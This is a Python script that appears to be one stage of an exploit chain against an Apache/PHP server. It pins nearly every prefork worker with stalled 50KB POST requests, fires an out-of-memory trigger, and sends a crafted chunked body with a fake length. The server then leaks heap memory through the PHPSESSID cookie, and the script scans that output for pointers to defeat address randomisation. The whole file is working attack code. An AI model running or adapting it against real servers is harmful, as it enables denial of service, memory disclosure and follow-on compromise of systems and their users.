#!/usr/bin/env python3
"""Diagnostic: pin workers, do A1+B1, dump leak details.

usage:
  python3 diag_leak.py --host 127.0.0.1 --port 18110
  python3 diag_leak.py --port 18110 --workers 1
"""
from __future__ import annotations

import argparse
import os
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import time
import urllib.parse
from collections import Counter

HERE = os.path.dirname(os.path.abspath(__file__))
PURE = os.path.join(HERE, "pure")
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Diagnostic: pin workers, fire A1+B1, dump leak details")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18110)
    ap.add_argument("--workers", type=int, default=150,
                    help="prefork MaxRequestWorkers (default: 150)")
    ap.add_argument("--timeout", type=float, default=600.0,
                    help="overall timeout for chunked sends (default: 600)")
    args = ap.parse_args()

    tmp = tempfile.mkdtemp(prefix="p2s-diag-")
    holders: list[socket.socket] = []
    try:
        return _run(args, tmp, holders)
    finally:
        for s in holders:
            try:
                s.close()
            except OSError:
                pass
        shutil.rmtree(tmp, ignore_errors=True)
        print("\n[*] Done. Holders released.")


def _run(args, tmp: str, holders: list[socket.socket]) -> int:
    # 1. Pin workers
    n_hold = max(args.workers - 1, 0)
    if n_hold:
        print("[*] Pinning workers...")
        for i in range(n_hold):
            try:
                s = socket.create_connection((args.host, args.port), timeout=5)
                # send 50KB upfront; with reqtimeout minrate=500 this
                # extends the deadline by ~100s, needed for remote targets
                s.sendall(("POST /index.php HTTP/1.1\r\nHost: %s\r\n" % args.host).encode() +
                          b"Content-Type: application/x-www-form-urlencoded\r\n"
                          b"Content-Length: 1048576\r\n\r\n" + b"x" * 50000)
                holders.append(s)
            except OSError as e:
                print("    holder %d/%d failed: %r" % (i + 1, n_hold, e))
                break
            time.sleep(0.01)
        time.sleep(0.8)
        print("    pinned %d/%d workers (%d holders)" % (
            len(holders) + 1, args.workers, len(holders)))

    # 2. A1
    print("[*] A1: OOM trigger...")
    a1 = os.path.join(tmp, "a.bin")
    subprocess.run([sys.executable, os.path.join(PURE, "mk_a1.py"),
                    "--out", a1, "--big", "78"], check=True,
                   stdout=subprocess.DEVNULL)
    subprocess.run([sys.executable, os.path.join(PURE, "chunked_send.py"),
                    "--host", args.host, "--port", str(args.port),
                    "--body-file", a1, "--path", "/index.php" + Q,
                    "--timeout", str(min(180, args.timeout))], check=True)
    time.sleep(0.3)

    # 3. B1
    print("[*] B1: leak attempt...")
    b1 = os.path.join(tmp, "b1.bin")
    spec = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
    subprocess.run([sys.executable, os.path.join(PURE, "mk_leak_b.py"),
                    "--out", b1, "--spec", spec,
                    "--fake-len", "0xC8000", "--tag"], check=True,
                   stdout=subprocess.DEVNULL)
    leak_file = os.path.join(tmp, "leak.resp")
    subprocess.run([sys.executable, os.path.join(PURE, "chunked_send.py"),
                    "--host", args.host, "--port", str(args.port),
                    "--body-file", b1, "--path", "/index.php",
                    "--timeout", str(args.timeout),
                    "--save-response", leak_file], check=True)

    # 4. Analyze
    with open(leak_file, "rb") as fh:
        resp = fh.read()
    print("\n[*] Response: %d bytes" % len(resp))
    print("    First 200 bytes: %r" % resp[:200])

    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        print("    NO Set-Cookie found!")
        return 1

    val = resp[i + len("Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    print("    Raw Set-Cookie value length: %d" % len(val))
    print("    First 100 chars: %r" % val[:100])
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    print("    Decoded length: %d" % len(dec))
    print("    First 32 bytes hex: %s" % dec[:32].hex())

    counts: Counter[int] = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        if 0x7F0000000000 <= q <= 0xFFFFFFFFFFFF:
            counts[q] += 1
    print("    Heap pointers found: %d unique=%d" % (sum(counts.values()), len(counts)))
    if counts:
        for ptr, n in counts.most_common(5):
            print("      %#x: %d" % (ptr, n))

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
